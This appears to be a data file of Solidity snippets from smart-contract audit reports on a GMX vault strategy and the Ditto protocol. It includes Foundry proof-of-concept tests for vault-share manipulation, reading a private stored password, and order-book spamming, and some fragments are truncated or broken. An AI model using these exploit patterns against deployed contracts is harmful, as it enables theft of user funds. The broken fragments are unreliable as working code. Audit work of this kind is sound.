"```\npragma solidity 0.8.21;\n\nimport { console, console2 } from ""forge-std/Test.sol"";\nimport { TestUtils } from ""../../helpers/TestUtils.sol"";\nimport { IERC20 } from ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";\nimport { GMXMockVaultSetup } from ""./GMXMockVaultSetup.t.sol"";\nimport { GMXTypes } from ""../../../contracts/strategy/gmx/GMXTypes.sol"";\nimport { GMXTestHelper } from ""./GMXTestHelper.sol"";\n\nimport { IDeposit } from ""../../../contracts/interfaces/protocols/gmx/IDeposit.sol"";\nimport { IEvent } from ""../../../contracts/interfaces/protocols/gmx/IEvent.sol"";\n\ncontract GMXDepositTest is GMXMockVaultSetup, GMXTestHelper, TestUtils {\n    function test_POC2() public {\n        uint256 lpAmtUser1 = 0.000005e18; // ~400$\n\n        vm.startPrank(owner);\n        IERC20(address(WETHUSDCpair)).transfer(address(user1), lpAmtUser1);\n        vm.stopPrank();\n\n        vm.startPrank(owner);\n        _createDeposit(address(WETH), 10 ether, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n        mockExchangeRouter.executeDeposit(address(WETH), address(USDC), address(vault), address(callback));\n\n        (, uint256 debtAmtTokenBBefore) = vault.debtAmt();\n\n        vm.startPrank(user1);\n        _createDeposit(address(WETH), 0.1 ether, 0, SLIPPAGE, EXECUTION_FEE); // User1 creates deposit. The 0.1 ether is being leveraged\n        IERC20(address(WETHUSDCpair)).transfer(address(vault), lpAmtUser1); // User1 injects lp-tokens between createDeposit and processDeposit. They are not leveraged\n        vm.stopPrank();\n        mockExchangeRouter.executeDeposit(address(WETH), address(USDC), address(vault), address(callback));\n\n        vm.startPrank(user1);\n        uint256 vaultSharesAmount = IERC20(address(vault)).balanceOf(user1);\n        _createAndExecuteWithdrawal(address(WETH), address(USDC), address(USDC), vaultSharesAmount, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n\n        (, uint256 debtAmtTokenBAfter) = vault.debtAmt();\n```\nFile: GMXChecks.sol#afterWithdrawChecks\nif (GMXReader.lpAmt(self) >= self.withdrawCache.healthParams.lpAmtBefore) {\n    revert Errors.InsufficientLPTokensBurned();\n}\n```"
"```\nFile: GMXWithdraw.sol\nself.vault.burn(\n    self.withdrawCache.user,\n    self.withdrawCache.withdrawParams.shareAmt\n)\n```\npragma solidity 0.8.21;\n\nimport {\n    console,\n    console2\n} from ""forge-std/Test.sol"";\nimport {\n    TestUtils\n} from ""../../helpers/TestUtils.sol"";\nimport {\n    IERC20\n} from ""@openzeppelin/contracts/token/ERC20/IERC20.sol"";\nimport {\n    IERC20Errors\n} from ""@openzeppelin/contracts/interfaces/draft-IERC6093.sol"";\nimport {\n    GMXMockVaultSetup\n} from ""./GMXMockVaultSetup.t.sol"";\nimport {\n    GMXTypes\n} from ""../../../contracts/strategy/gmx/GMXTypes.sol"";\nimport {\n    GMXTestHelper\n} from ""./GMXTestHelper.sol"";\n\nimport {\n    IDeposit\n} from ""../../../contracts/interfaces/protocols/gmx/IDeposit.sol"";\nimport {\n    IEvent\n} from ""../../../contracts/interfaces/protocols/gmx/IEvent.sol"";\nimport {\n    Attacker\n} from ""./Attacker.sol"";\n\ncontract GMXDepositTest is GMXMockVaultSetup, GMXTestHelper, TestUtils {\n    function test_POC4() public {\n        vm.startPrank(address(owner));\n        _createAndExecuteDeposit(address(WETH), address(USDC), address(WETH), 10 ether, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n\n        vm.startPrank(address(user1));\n        _createAndExecuteDeposit(address(WETH), address(USDC), address(WETH), 10 ether, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n\n        uint256 vaultSharesAmt = IERC20(address(vault)).balanceOf(address(user1)); //Vault Shares from user1 to withdraw\n        vm.startPrank(address(user1));\n        _createWithdrawal(address(USDC), vaultSharesAmt, 0, SLIPPAGE, EXECUTION_FEE); //User 1 creates a withdrawal\n        IERC20(address(vault)).transfer(address(user2), vaultSharesAmt); //Before processWithdraw is executed and the user's Vault Shares are burned, he sends them away\n\n        vm.expectRevert(\n            abi.encodeWithSelector(IERC20Errors.ERC20InsufficientBalance.selector, address(user1), 0, vaultSharesAmt)\n        );\n        mockExchangeRouter.executeWithdrawal(address(WETH), address(USDC), address(vault), address(callback)); //executeWithdraw reverted as there are no tokens to burn\n        vm.stop"
"```\nfunction deposit(\n    GMXTypes.Store storage self,\n    GMXTypes.DepositParams memory dp,\n    bool isNative\n) external {\n    if (dp.token == address(self.lpToken)) {\n        // If LP token deposited\n        _dc.depositValue = self.gmxOracle.getLpTokenValue(\n            address(self.lpToken),\n            address(self.tokenA),\n            address(self.tokenA),\n            address(self.tokenB),\n            false,\n            false\n        ) * dp.amt / SAFE_MULTIPLIER;\n    } else {\n        // If tokenA or tokenB deposited\n        _dc.depositValue = GMXReader.convertToUsdValue(\n            self,\n            address(dp.token),\n            dp.amt\n        );\n    }\n\n    _alp.tokenAAmt = self.tokenA.balanceOf(address(this));\n    _alp.tokenBAmt = self.tokenB.balanceOf(address(this));\n    _alp.minMarketTokenAmt = GMXManager.calcMinMarketSlippageAmt(\n        self,\n        _dc.depositValue,\n        dp.slippage\n    );\n    _alp.executionFee = dp.executionFee;\n\n    _dc.depositKey = GMXManager.addLiquidity(\n        self,\n        _alp\n    );\n}"
"```\nfunction processDeposit(GMXTypes.Store storage self) external {\n    try GMXProcessDeposit.processDeposit(self) {\n        //..more code\n    } catch (bytes memory reason) {\n        self.status = GMXTypes.Status.Deposit_Failed;\n        emit DepositFailed(reason);\n    }\n}\n```\n```\n(bool _swapNeeded, address _tokenFrom, address _tokenTo, uint256 _tokenToAmt) = \n    GMXManager.calcSwapForRepay(self, _rp);\n\nif (_swapNeeded) {\n    ISwap.SwapParams memory _sp;\n\n    _sp.tokenIn = _tokenFrom;\n    _sp.tokenOut = _tokenTo;\n    _sp.amountIn = IERC20(_tokenFrom).balanceOf(address(this));\n    _sp.amountOut = _tokenToAmt;\n    _sp.slippage = self.minSlippage;\n    _sp.deadline = block.timestamp;\n    GMXManager.swapTokensForExactTokens(self, _sp);\n}\n```\n```\nfunction processDepositFailure(\n    GMXTypes.Store storage self,\n    uint256 slippage,\n    uint256 executionFee\n) external {\n    GMXChecks.beforeProcessAfterDepositFailureChecks(self);\n\n    GMXTypes.RemoveLiquidityParams memory _rlp;\n\n    if (GMXReader.lpAmt(self) <= self.depositCache.healthParams.lpAmtBefore) {\n        processDepositFailureLiquidityWithdrawal(self);\n    }\n}\n```"
"```\nfunction deposit(\n    GMXTypes.Store storage self,\n    GMXTypes.DepositParams memory dp,\n    bool isNative\n) external {\n    GMXChecks.beforeDepositChecks(self, dp.depositValue);\n\n    self.status = GMXTypes.Status.Deposit;\n}\n```\n```\nfunction beforeDepositChecks(\n    GMXTypes.Store storage self,\n    uint256 depositValue\n) external view {\n    if (self.status!= GMXTypes.Status.Open)\n        revert Errors.NotAllowedInCurrentVaultStatus();\n}\n```"
"```\nfunction deposit(\n  GMXTypes.Store storage self,\n  GMXTypes.DepositParams memory dp,\n  bool isNative\n) external {\n    if (self.tokenA.balanceOf(address(this)) > 0) {\n        self.tokenA.safeTransfer(self.trove, self.tokenA.balanceOf(address(this)));\n    }\n    if (self.tokenB.balanceOf(address(this)) > 0) {\n        self.tokenB.safeTransfer(self.trove, self.tokenB.balanceOf(address(this)));\n    }\n}\n```\n```\nfunction withdraw(\n  GMXTypes.Store storage self,\n  GMXTypes.WithdrawParams memory wp\n) external {\n    if (self.tokenA.balanceOf(address(this)) > 0) {\n        self.tokenA.safeTransfer(self.trove, self.tokenA.balanceOf(address(this)));\n    }\n    if (self.tokenB.balanceOf(address(this)) > 0) {\n        self.tokenB.safeTransfer(self.trove, self.tokenB.balanceOf(address(this)));\n    }\n}\n```\n```\nfunction compound(\n  GMXTypes.Store storage self,\n  GMXTypes.CompoundParams memory cp\n) external {\n  if (self.tokenA.balanceOf(address(self.trove)) > 0) {\n    self.tokenA.safeTransferFrom(\n      address(self.trove),\n      address(this),\n      self.tokenA.balanceOf(address(self.trove))\n    );\n  }\n  if (self.tokenB.balanceOf(address(self.trove)) > 0) {\n    self.tokenB.safeTransferFrom(\n      address(self.trove),\n      address(this),\n      self.tokenB.balanceOf(address(self.trove))\n    );\n  }\n  GMXChecks.beforeCompoundChecks(self);\n}\n```\n```\nfunction beforeCompoundChecks(\n    GMXTypes.Store storage self\n) external view {\n    if (\n        self.status!= GMXTypes.Status.Open &&\n        self.status!= GMXTypes.Status.Compound_Failed\n    ) {\n        revert Errors.NotAllowedInCurrentVaultStatus();\n    }\n}\n```\n```\nfunction emergencyPause(\n    GMXTypes.Store storage self\n) external {\n    self.refundee = payable(msg.sender);\n\n    GMXTypes.RemoveLiquidityParams memory _rlp;\n\n    // Remove all of the vault's LP tokens\n    _rlp.lpAmt = self.lpToken.balanceOf(address(this));\n    _rlp.executionFee = msg.value;\n\n    GMXManager.removeLiquidity(\n        self,\n        _rlp\n    );\n\n    self.status = GMXTypes.Status.Paused;\n\n    emit EmergencyPause();\n}\n```\n```\nfunction emergencyClose(\n  GMXTypes.Store storage self,\n  uint256 deadline\n) external {\n    GMXChecks.beforeEmergencyCloseChecks(self);\n\n    GMXTypes.RepayParams memory _rp;\n    (\n        _rp.repayTokenAAmt,\n        _rp.repayTokenBAmt\n    ) = GMXManager.calcRepay(self, 1e18);\n\n    (\n        bool _swapNeeded,\n        address _tokenFrom,\n        address _tokenTo,\n        uint256 _tokenToAmt\n    ) = GMXManager.calcSwapForRepay(self, _rp);\n\n    if (_swapNeeded) {\n        ISwap.SwapParams memory _sp;\n        _sp.tokenIn = _tokenFrom;\n        _sp.tokenOut = _tokenTo;\n        _sp.amountIn = IERC20(_tokenFrom).balanceOf(address(this));\n        _sp.amountOut = _tokenToAmt;\n        _sp.slippage = self.minSlippage;\n        _sp.deadline = deadline;\n\n        GMXManager.swapTokensForExactTokens(self, _sp);\n    }\n\n    GMXManager.repay(\n        self,\n        _rp.repayTokenAAmt,\n        _rp.repayTokenBAmt\n    );\n\n    self.status = GMXTypes.Status.Closed;\n\n    emit EmergencyClose(\n        _rp.repayTokenAAmt,\n        _rp.repayTokenBAmt\n    );\n}\n```\n```\ncontract GMXTrove {\n\n    // Address of the vault this trove handler is for\n    IGMXVault public vault;\n\n    /**\n     * @notice Initialize trove contract with associated vault address\n     * @param _vault Address of vault\n     */\n    constructor (address _vault) {\n        vault = IGMXVault(_vault);\n\n        GMXTypes.Store memory _store = vault.store();\n\n        // Set token approvals for this trove's vault contract\n        _store.tokenA.approve(address(vault), type(uint256).max);\n        _store.tokenB.approve(address(vault), type(uint256).max);\n    }\n}\n```"
"```\nfunction emergencyResume(\n    GMXTypes.Store storage self\n) external {\n    GMXChecks.beforeEmergencyResumeChecks(self);\n\n    self.status = GMXTypes.Status.Resume;\n\n    self.refundee = payable(msg.sender);\n\n    GMXTypes.AddLiquidityParams memory _alp;\n\n    _alp.tokenAAmt = self.tokenA.balanceOf(address(this));\n    _alp.tokenBAmt = self.tokenB.balanceOf(address(this));\n    _alp.executionFee = msg.value;\n\n    GMXManager.addLiquidity(\n        self,\n        _alp\n    );\n}\n```\n```\nfunction afterDepositCancellation(\n    bytes32 depositKey,\n    IDeposit.Props memory depositProps,\n    IEvent.Props memory eventData\n) external onlyController {\n    GMXTypes.Store memory _store = vault.store();\n\n    if (_store.status == GMXTypes.Status.Deposit) {\n        if (_store.depositCache.depositKey == depositKey) {\n            vault.processDepositCancellation();\n        }\n    } else if (_store.status == GMXTypes.Status.Rebalance_Add) {\n        if (_store.rebalanceCache.depositKey == depositKey) {\n            vault.processRebalanceAddCancellation();\n        }\n    } else if (_store.status == GMXTypes.Status.Compound) {\n        if (_store.compoundCache.depositKey == depositKey) {\n            vault.processCompoundCancellation();\n        }\n    } else {\n        revert Errors.DepositCancellationCallback();\n    }\n}\n```\n```\nfunction beforeEmergencyResumeChecks(\n    GMXTypes.Store storage self\n) external view {\n    if (self.status!= GMXTypes.Status.Paused) {\n        revert Errors.NotAllowedInCurrentVaultStatus();\n    }\n}\n```"
"```\n/**\n * @notice @inheritdoc GMXVault\n * @param self GMXTypes.Store\n * @param isNative Boolean as to whether user is depositing native asset (e.g. ETH, AVAX, etc.)\n */\nfunction deposit(\n    GMXTypes.Store storage self,\n    GMXTypes.DepositParams memory dp,\n    bool isNative\n) external {\n    self.status = GMXTypes.Status.Deposit;\n\n    self.vault.mintFee();\n    // rest of code\n```\n```\n/**\n * @notice Mint vault token shares as management fees to protocol treasury\n*/\nfunction mintFee() public {\n    _mint(_store.treasury, GMXReader.pendingFee(_store));\n    _store.lastFeeCollected = block.timestamp;\n}\n```\n```\n/**\n * @notice @inheritdoc GMXVault\n * @param self GMXTypes.Store\n */\nfunction processDeposit(\n    GMXTypes.Store storage self\n) external {\n    GMXChecks.beforeProcessDepositChecks(self);\n\n    try {\n        GMXProcessDeposit.processDeposit(self);\n    } catch {\n        // If there are any issues, a DepositFailed event will be emitted and processDepositFailure()\n        // should be triggered to refund assets accordingly and reset the vault status to Open again.\n        // Mint shares to depositor\n        self.vault.mint(self.depositCache.user, self.depositCache.sharesToUser);\n        // rest of code\n    }\n}\n```"
"```\nif (self.delta == GMXTypes.Delta.Neutral):\n    (uint256 _tokenAWeight,) = tokenWeights(self)\n\n    uint256 _maxTokenALending = convertToUsdValue(\n        self,\n        address(self.tokenA),\n        self.tokenALendingVault.totalAvailableAsset()\n    ) * SAFE_MULTIPLIER / (self.leverage * _tokenAWeight / SAFE_MULTIPLIER)\n\n    uint256 _maxTokenBLending = convertToUsdValue(\n        self,\n        address(self.tokenB),\n        self.tokenBLendingVault.totalAvailableAsset()\n    ) * SAFE_MULTIPLIER / (self.leverage * _tokenAWeight / SAFE_MULTIPLIER) - 1e18\n```\n```\nTotal value to deposit to GMX = lv\nValue of tokens to short = lva\n\nHence this value will be borrowed from the tokenA lending vault\n\nRemaining value to borrow (from tokenB lending vault) = lv - lva - v\nHence if there is Tb value of tokens in tokenB lending vault, v <= Tb / (l - la - 1)\n```"
"```\n/**\n * @notice Get token A and token B's LP token amount required for a given value\n * @param givenValue Given value needed, expressed in 1e30\n * @param marketToken LP token address\n * @param indexToken Index token address\n * @param longToken Long token address\n * @param shortToken Short token address\n * @param isDeposit Boolean for deposit or withdrawal\n * @param maximize Boolean for minimum or maximum price\n * @return lpTokenAmount Amount of LP tokens; expressed in 1e18\n */\nfunction getLpTokenAmount(\n    uint256 givenValue,\n    address marketToken,\n    address indexToken,\n    address longToken,\n    address shortToken,\n    bool isDeposit,\n    bool maximize\n) public view returns (uint256) {\n    uint256 _lpTokenValue = getLpTokenValue(\n        marketToken,\n        indexToken,\n        longToken,\n        shortToken,\n        isDeposit,\n        maximize\n    );\n\n    return givenValue * SAFE_MULTIPLIER / _lpTokenValue;\n}\n```"
"```\nfunction _getChainlinkResponse(address _feed) internal view returns (ChainlinkResponse memory) {\n    ChainlinkResponse memory _chainlinkResponse;\n\n    _chainlinkResponse.decimals = AggregatorV3Interface(_feed).decimals();\n\n    (\n        uint80 _latestRoundId,\n        int256 _latestAnswer,\n        uint256 _startedAt,\n        uint256 _latestTimestamp,\n        uint80 _answeredInRound\n    ) = AggregatorV3Interface(_feed).latestRoundData();\n\n    _chainlinkResponse.roundId = _latestRoundId;\n    _chainlinkResponse.answer = _latestAnswer;\n    _chainlinkResponse.timestamp = _latestTimestamp;\n    _chainlinkResponse.success = true;\n\n    return _chainlinkResponse;\n}"
"```\nfunction consult(address token) public view whenNotPaused returns (int256, uint8) {\n    address _feed = feeds[token];\n\n    if (_feed == address(0)) {\n        revert Errors.NoTokenPriceFeedAvailable();\n    }\n\n    ChainlinkResponse memory chainlinkResponse = _getChainlinkResponse(_feed);\n    ChainlinkResponse memory prevChainlinkResponse = _getPrevChainlinkResponse(_feed, chainlinkResponse.roundId);\n\n    if (_chainlinkIsFrozen(chainlinkResponse, token)) {\n        revert Errors.FrozenTokenPriceFeed();\n    }\n    if (_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse, token)) {\n        revert Errors.BrokenTokenPriceFeed();\n    }\n\n    return (chainlinkResponse.answer, chainlinkResponse.decimals);\n}"
"```\nFile: GMXVault.sol\n\nfunction deposit(GMXTypes.DepositParams memory dp) external payable nonReentrant {\n    GMXDeposit.deposit(_store, dp, false);\n}\n```\n```\nFile: GMXDeposit.sol\n\nfunction deposit(\n    GMXTypes.Store storage self,\n    GMXTypes.DepositParams memory dp,\n    bool isNative\n) external {\n    // Borrow assets and create deposit in GMX\n    (\n        uint256 _borrowTokenAAmt,\n        uint256 _borrowTokenBAmt\n    ) = GMXManager.calcBorrow(self, dp.depositValue);\n\n}\n```\n```\npragma solidity ^0.8.0;\n\ncontract GMXManager {\n    /**\n     * @notice Calculate amount of tokenA and tokenB to borrow\n     * @param self GMXTypes.Store\n     * @param depositValue USD value in 1e18\n     */\n    function calcBorrow(\n        GMXTypes.Store storage self,\n        uint256 depositValue\n    ) external view returns (uint256, uint256) {\n        // Calculate final position value based on deposit value\n        uint256 _positionValue = depositValue * self.leverage / SAFE_MULTIPLIER;\n\n        // Obtain the value to borrow\n        uint256 _borrowValue = _positionValue - depositValue;\n\n        uint256 _tokenADecimals = IERC20Metadata(address(self.tokenA)).decimals();\n        uint256 _tokenBDecimals = IERC20Metadata(address(self.tokenB)).decimals();\n\n        uint256 _borrowLongTokenAmt;\n        uint256 _borrowShortTokenAmt;\n\n        if (self.delta == GMXTypes.Delta.Neutral) {\n            // Get token weights in LP, e.g. 50% = 5e17\n            (uint256 _tokenAWeight,) = GMXReader.tokenWeights(self);\n\n            // Get value of long token (typically tokenA)\n            uint256 _longTokenWeightedValue = _tokenAWeight * _positionValue / SAFE_MULTIPLIER;\n\n            // Borrow appropriate amount in long token to hedge\n            _borrowLongTokenAmt = _longTokenWeightedValue * SAFE_MULTIPLIER\n                / GMXReader.convertToUsdValue(self, address(self.tokenA), 10**(_tokenADecimals))\n                / (10 ** (18 - _tokenADecimals));\n\n            // Borrow the shortfall value in short token\n            _borrowShortTokenAmt = (_borrowValue - _longTokenWeightedValue) * SAFE_MULTIPLIER\n                / GMXReader.convertToUsdValue(self, address(self.tokenB), 10**(_tokenBDecimals))\n                / (10 ** (18 - _tokenBDecimals));\n        }\n    }\n}\n```"
```\nfunction svTokenValue(GMXTypes.Store storage self) public view returns (uint256) {\n    uint256 equityValue_ = equityValue(self);\n    uint256 totalSupply_ = IERC20(address(self.vault)).totalSupply();\n    if (equityValue_ == 0 || totalSupply_ == 0) {\n        return SAFE_MULTIPLIER;\n    }\n    return equityValue_ * SAFE_MULTIPLIER / totalSupply_;\n}\n```
```\n69\nif (\n    self.withdrawCache.withdrawParams.token == address(self.tokenA) ||\n    self.withdrawCache.withdrawParams.token == address(self.tokenB)\n) {\n    70\n    GMXChecks.afterWithdrawChecks(self);\n    71\n}\n```
"```\nprivate string s_password;\n```\n```\nfunction test_any_non_owner_can_see_password() public {\n    string memory victimPassword = ""mySecretPassword""; // Defines Victim's (Owner's) password\n    vm.startPrank(owner); // Simulates Victim's address for the next call\n    passwordStore.setPassword(victimPassword); // Victim sets their password\n\n    uint256 S_PASSWORD_STORAGE_SLOT_VALUE = 1;\n\n    bytes32 slotData = vm.load(address(passwordStore), bytes32(S_PASSWORD_STORAGE_SLOT_VALUE));\n\n    string memory anyoneCanReadPassword = string(abi.encodePacked(slotData));\n    console.log(anyoneCanReadPassword);\n}\n```"
"```\nfunction getZethTotal(uint256 vault) internal view returns (uint256 zethTotal) {\n    AppStorage storage s = appStorage();\n    address[] storage bridges = s.vaultBridges[vault];\n    uint256 bridgeCount = bridges.length;\n\n    for (uint256 i = 0; i < bridgeCount) {\n        zethTotal += IBridge(bridges[i]).getZethValue();\n        unchecked {\n            i++;\n        }\n    }\n}\n```\n```\nfunction test_double_bridge_push() public {\n    vm.prank(owner);\n    diamond.createBridge(_bridgeReth, Vault.CARBON, 0, 0);\n    diamond.getUndistributedYield(Vault.CARBON);\n    assert(diamond.getUndistributedYield(Vault.CARBON) > 0); // As no yield was generated, this should not be true\n}\n```"
"```\nfunction baseOracleCircuitBreaker(\n    uint256 protocolPrice,\n    uint80 roundId,\n    int256 chainlinkPrice,\n    uint256 timeStamp,\n    uint256 chainlinkPriceInEth\n) private view returns (uint256 _protocolPrice) {\n    if (invalidFetchData || priceDeviation) {\n        uint256 twapPrice = IDiamond(payable(address(this))).estimateWETHInUSDC(\n            Constants.UNISWAP_WETH_BASE_AMT, 30 minutes\n        );\n        uint256 twapPriceInEther = (twapPrice / Constants.DECIMAL_USDC) * 1 ether;\n```\n```\ntwapPrice = 1902501929\ntwapPriceInEther = 1902000000000000000000\n\ntwapPriceInEther = twapPrice * 10**18\n```"
"```\nfunction mintNFT(address asset, uint8 shortRecordId)\n    external\n    isNotFrozen(asset)\n    nonReentrant\n    onlyValidShortRecord(asset, msg.sender, shortRecordId)\n{\n    if (shortRecordId == Constants.SHORT_MAX_ID) {\n        revert Errors.CannotMintLastShortRecord();\n    }\n    STypes.ShortRecord storage short = \n        s.shortRecords[asset][msg.sender][shortRecordId];\n\n    if (short.tokenId!= 0) \n        revert Errors.AlreadyMinted();\n\n    s.nftMapping[s.tokenIdCounter] = \n        STypes.NFT({\n            owner: msg.sender,\n            assetId: s.asset[asset].assetId,\n            shortRecordId: shortRecordId\n        });\n\n    short.tokenId = s.tokenIdCounter;\n\n    s.tokenIdCounter += 1;\n}"
"```\nFILE: 2023-09-ditto/contracts/libraries/Constants.sol\n\nuint256 internal constant BRIDGE_YIELD_UPDATE_THRESHOLD = 1000 ether;\n\nuint256 internal constant BRIDGE_YIELD_PERCENT_THRESHOLD = 0.01 ether;\n```\nFILE: 2023-09-ditto/contracts/facets/BridgeRouterFacet.sol\n\nfunction maybeUpdateYield(uint256 vault, uint88 amount) private {\n    uint88 zethTotal = s.vault[vault].zethTotal;\n    if (\n        zethTotal > Constants.BRIDGE_YIELD_UPDATE_THRESHOLD &&\n        amount.div(zethTotal) > Constants.BRIDGE_YIELD_PERCENT_THRESHOLD\n    ) {\n        // Update yield for ""large"" bridge deposits\n        vault.updateYield();\n    }\n}\n```"
"```\nfunction test_DeleteBridgeWithAssets() public {\n    console.log(""Sender ethEscrowed in vault 2 before deposit: "", diamond.getVaultUserStruct(2, sender).ethEscrowed);\n    deal(_rethA, sender, 10000 ether);\n\n    vm.startPrank(sender);\n    uint88 deposit1 = 1000 ether;\n    uint88 withdrawAmount = 100 ether;\n    diamond.deposit(_bridgeRethToBeDeleted, deposit1);\n    console.log(""Sender ethEscrowed in vault2 after deposit: "", diamond.getVaultUserStruct(2, sender).ethEscrowed);\n    diamond.withdraw(_bridgeRethToBeDeleted, withdrawAmount);\n    console.log(""Sender ethEscrowed after withdraw: "", diamond.getVaultUserStruct(2, sender).ethEscrowed);\n    vm.stopPrank();\n\n    console.log(""Balance of reth in the bridgeRethToBeDeleted: "", rethA.balanceOf(_bridgeRethToBeDeleted));\n\n    vm.startPrank(owner);\n    diamond.deleteBridge(_bridgeRethToBeDeleted);\n    vm.stopPrank();\n\n    vm.startPrank(sender);\n    vm.expectRevert();\n    diamond.withdraw(_bridgeRethToBeDeleted, withdrawAmount);\n    console.log(""Balance of reth in the bridgeRethToBeDeleted: "", rethA.balanceOf(_bridgeRethToBeDeleted));\n    vm.stopPrank();\n}\n```\n```\nrethA.approve(\n    _bridgeRethToBeDeleted,\n    0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n)\n```\n```\npublic IBridge bridgeRethToBeDeleted;\npublic address _bridgeRethToBeDeleted;\npublic IAsset zethToBeDeletedVault;\npublic address _zethToBeDeletedVault;\npublic IRocketStorage rocketStorageA;\npublic address _rocketStorageA;\npublic IRocketTokenRETH rethA;\npublic address _rethA;\n```\n```\nif (chainId == 31337) {\n    // mocks\n    _immutableCreate2Factory = deployCode(""ImmutableCreate2Factory.sol"");\n\n    if (isMock) {\n        _steth = deployCode(""STETH.sol"");\n        _unsteth = deployCode(""UNSTETH.sol"", abi.encode(_steth));\n        _rocketStorage = deployCode(""RocketStorage.sol"");\n        _reth = deployCode(""RocketTokenRETH.sol"");\n        reth = IRocketTokenRETH(_reth);\n        _ethAggregator = deployCode(""MockAggregatorV3.sol"");\n        _rocketStorageA = deployCode(""RocketStorage.sol"");\n        _rethA = deployCode(""RocketTokenRETH.sol"");\n        rethA = IRocketTokenRETH(_rethA);\n\n        rocketStorage = IRocketStorage(_rocketStorage);\n        steth = ISTETH(_steth);\n        unsteth = IUNSTETH(payable(_unsteth));\n        ethAggregator = IMockAggregatorV3(_ethAggregator);\n    }\n\n    rocketStorageA = IRocketStorage(_rocketStorageA);\n    steth = ISTETH(_steth);\n    unsteth = IUNSTETH(payable(_unsteth));\n    ethAggregator = IMockAggregatorV3(_ethAggregator);\n\n    _zethToBeDeletedVault = factory.safeCreate2(\n        salt,\n        abi.encodePacked(\n            vm.getCode(""Asset.sol:Asset""), abi.encode(_diamond, ""Zebra ETH Two"", ""ZETHT"")\n        )\n    );\n\n    _bridgeRethToBeDeleted = factory.safeCreate2(\n        salt,\n        abi.encodePacked(\n            vm.getCode(""BridgeReth.sol:BridgeReth""),\n            abi.encode(_rocketStorageA, _diamond)\n        )\n    );\n\n    bridgeRethToBeDeleted = IBridge(_bridgeRethToBeDeleted);\n\n    MTypes.CreateVaultParams memory vaultParams;\n    vaultParams.zethTithePercent = 10_00;\n    vaultParams.dittoMatchedRate = 1;\n    vaultParams.dittoShorterRate = 1;\n    diamond.createVault({zeth: _zeth, vault: Vault.CARBON, params: vaultParams});\n\n    MTypes.CreateVaultParams memory vaultParamsTwo;\n    vaultParamsTwo.zethTithePercent = 9_00;\n    vaultParamsTwo.dittoMatchedRate = 1;\n    vaultParams"
"```\npragma solidity 0.8.21;\n\nimport {Errors} from ""contracts/libraries/Errors.sol"";\nimport {Events} from ""contracts/libraries/Events.sol"";\nimport {STypes, MTypes, O} from ""contracts/libraries/DataTypes.sol"";\nimport {Constants} from ""contracts/libraries/Constants.sol"";\nimport ""forge-std/console.sol"";\nimport {OBFixture} from ""test/utils/OBFixture.sol"";\n\ncontract POC is OBFixture {\n    address[3] private bidders = [address(435433), address(423432523), address(522366)];\n    address[3] private shorters = [address(243422243242), address(52353646324532), address(40099)];\n    address private attacker = address(3234);\n\n    function setUp() public override {\n        super.setUp();\n    }\n\n    function test_fillWithAsks() public {\n        depositUsd(attacker, DEFAULT_AMOUNT * 10000);\n\n        uint balanceAssetBefore = diamond.getAssetBalance(asset, attacker);\n        vm.startPrank(attacker);\n        for (uint i = 0; i < 1000; i++) {\n            createLimitAsk(10**24, 10**10);\n        }\n        vm.stopPrank();\n        STypes.Order[] memory asks = diamond.getAsks(asset);\n        console.log(""tiny asks created : "", asks.length);\n        console.log(""hack cost asset"", balanceAssetBefore - diamond.getAssetBalance(asset, attacker));\n    }\n\n    function test_cancleOrders() public {\n        diamond.setOrderIdT(asset, 64998);\n        // create multiple bids and 1 shorts\n        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, bidders[0]); // id 64998\n        fundLimitShortOpt(uint80(DEFAULT_PRICE) * 4, DEFAULT_AMOUNT, shorters[0]); // id 64999\n        fundLimitBidOpt(DEFAULT_PRICE * 2, DEFAULT_AMOUNT, bidders[1]); // id 65000\n        fundLimitBidOpt(DEFAULT_PRICE * 3, DEFAULT_AMOUNT, bidders[2]); // id 65001\n\n        // lets cancle the all the bids :\n        canclebid(64998);\n        uint s1 = vm.snapshot();\n        vm.revertTo(s1);\n        canclebid(65000);\n        uint s2 = vm.snapshot();\n        vm.revertTo(s2);\n        canclebid(65001);\n\n        // let's check the\n```\n[PASS] test_cancleOrders() (gas: 1218326)\nLogs:\n  balance of : 0x000000000000000000000000000000000006A4E9 0\n  balance of : 0x00000000000000000000000000000000193d114b 0\n  balance of : 0x000000000000000000000000000000000007f87E 0\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 222.12ms\n\nRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n```\n[PASS] test_fillWithAsks()\nLogs:\n  tiny asks created :  1000\n  hack cost asset 10000000000000 (which is less than 1 cusd)\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.17s\n\nRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```"
"```\nfunction _beforeTokenTransfer(address from, address, uint256) internal override {\n    // Don't run check if this is a mint transaction\n    if (from!= address(0)) {\n        bytes32 key = keccak256(abi.encodePacked(""user.deposit.block"", from));\n        uint256 lastDepositBlock = getUint(key);\n        if (lastDepositBlock > 0) {\n            uint256 depositDelay = getUint(keccak256(abi.encodePacked(keccak256(""dao.protocol.setting.network""), ""network.reth.deposit.delay"")));\n            uint256 blocksPassed = block.number - lastDepositBlock;\n            require(blocksPassed > depositDelay, ""Not enough time has passed since deposit"");\n            deleteUint(key);\n        }\n    }\n}\n```"
